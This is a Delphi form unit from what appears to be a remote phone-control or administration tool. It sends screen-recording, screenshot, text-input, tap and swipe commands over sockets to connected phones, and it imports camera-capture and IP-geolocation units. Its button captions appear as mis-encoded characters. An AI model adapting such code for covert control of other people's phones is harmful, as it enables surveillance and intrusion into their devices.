unit uScreen;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ExtCtrls,umain, ScktComp , DateUtils,uOrder,uFuncs, OleCtrls, SHDocVw,MSHTML,Jpeg,ShellApi,StrUtils
  ,uCameraCap,untQQWry,uDM, Menus, ComCtrls, ImgList; //uRecvData

type
  TfScreen = class(TForm)
    Panel6: TPanel;
    btnRecordScreen: TSpeedButton;
    btnInput: TSpeedButton;
    btnLight: TSpeedButton;
    Label6: TLabel;
    btnHome: TSpeedButton;
    btnReturn: TSpeedButton;
    chkSeriShot: TCheckBox;
    btnShotSeriesScreen: TButton;
    btnshot: TButton;
    edtVtKey: TEdit;
    ckSlide: TCheckBox;
    chkLongClick: TCheckBox;
    ScrollBox1: TScrollBox;
    imgScreen: TImage;
    procedure btnHomeClick(Sender: TObject);
    procedure btnReturnClick(Sender: TObject);
    procedure btnLightClick(Sender: TObject);
    procedure btnRecordScreenClick(Sender: TObject);

    procedure btnshotClick(Sender: TObject);
    procedure btnInputClick(Sender: TObject);
    procedure imgScreenMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure imgScreenMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure imgScreenMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure btnShotSeriesScreenClick(Sender: TObject);
  private
    { Private declarations }
    //mSlidePath:tPath;
  public
    { Public declarations }
  end;

var
  fScreen: TfScreen;

implementation

{$R *.dfm}

procedure TfScreen.btnHomeClick(Sender: TObject);
var
  phoneId:DWORD;
begin
  phoneId:=fmain.selectPhone();
  if(phoneId=0)then exit;
  dm.SendOrder(CMD_HOME,phoneId);
end;
//fmain.
procedure TfScreen.btnReturnClick(Sender: TObject);
var
  phoneId:DWORD;
begin
  phoneId:=fmain.selectPhone();
  if(phoneId=0)then exit;
  dm.SendOrder(CMD_RETURN,phoneId);

end;

procedure TfScreen.btnLightClick(Sender: TObject);
var
  phoneId:DWORD;
begin
  phoneId:=fmain.selectPhone();
  if(phoneId=0)then exit;
  dm.SendOrder(CMD_LIGHT,phoneId);

end;

procedure TfScreen.btnRecordScreenClick(Sender: TObject);
var
  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;
  if(btnRecordScreen.Caption='б╪фа')then begin
    //dm.SendOrder(socket,CMD_RECORD_SCREEN_START);
    dm.SendOrderToClient(socket,CMD_RECORD_SCREEN_START,integer(pClient^.Socket));
    btnRecordScreen.Caption:='мёб╪';
  end else begin
    //dm.SendOrder(socket,CMD_RECORD_SCREEN_END);
    dm.SendOrderToClient(socket,CMD_RECORD_SCREEN_END,integer(pClient^.Socket));
    btnRecordScreen.Caption:='б╪фа';
  end;

end;

procedure TfScreen.btnshotClick(Sender: TObject);
var
   data:DWORD;
  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;
  if(dm.StartRecvDataThread(CMD_SHOT)=false)then exit;
  data:=0;
  dm.SendOrderToClient(socket,CMD_SHOT,integer(pClient^.Socket),@data,sizeof(data));

end;

procedure TfScreen.btnInputClick(Sender: TObject);
var
   txt:string;
  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;
  txt:=trim(edtVtKey.Text);
  //dm.SendOrder(socket,CMD_INPUT,pchar(txt));
  dm.SendOrderToClient(socket,CMD_INPUT,integer(pClient^.Socket),pchar(txt),length(txt));
end;

procedure TfScreen.imgScreenMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  pos:tPosition;

  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;

   pos.dX:=x;
   pos.dY:=y;
   mSlidePath.x1:=x;
   mSlidePath.y1:=y;
   if(ckSlide.Checked=true)then exit;
   if(chkLongClick.Checked)then
      //dm.SendOrder(socket,CMD_LONG_CLICK,@pos,sizeof(pos))
      dm.SendOrderToClient(socket,CMD_LONG_CLICK,integer(pClient^.Socket),@pos,sizeof(pos))
   else
      //dm.SendOrder(socket,CMD_POS,@pos,sizeof(pos));
      dm.SendOrderToClient(socket,CMD_POS,integer(pClient^.Socket),@pos,sizeof(pos));

end;

procedure TfScreen.imgScreenMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  fMain.bar1.Panels[3].Text:='X:'+inttostr(x)+',Y:'+inttostr(y);
end;

procedure TfScreen.imgScreenMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  moveEndPos:tPosition;
  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;



  mSlidePath.x2:=x;
  mSlidePath.y2:=y;
  dm.SendOrderToClient(socket,CMD_SLIDE,integer(pClient^.Socket),@mSlidePath,sizeof(mSlidePath));
  //dm.SendOrder(socket,CMD_SLIDE,@mSlidePath,sizeof(mSlidePath));

end;

procedure TfScreen.btnShotSeriesScreenClick(Sender: TObject);
var
  data:DWORD;
  socket:TCustomWinSocket;
  pClient:pClientInfo;
begin
  if(fmain.selectPhone(socket,pClient)=false)then exit;
  if(btnShotSeriesScreen.Caption='фа©ь')then begin
    data:=1;
    if(dm.StartRecvDataThread(CMD_SHOT)=false)then exit;
    btnShotSeriesScreen.Caption:='мёж╧';
  end else begin
    data:=2;
    btnShotSeriesScreen.Caption:='фа©ь';
  end;
  dm.SendOrderToClient(socket,CMD_SHOT,integer(pClient^.Socket),@data,sizeof(data));

end;

end.
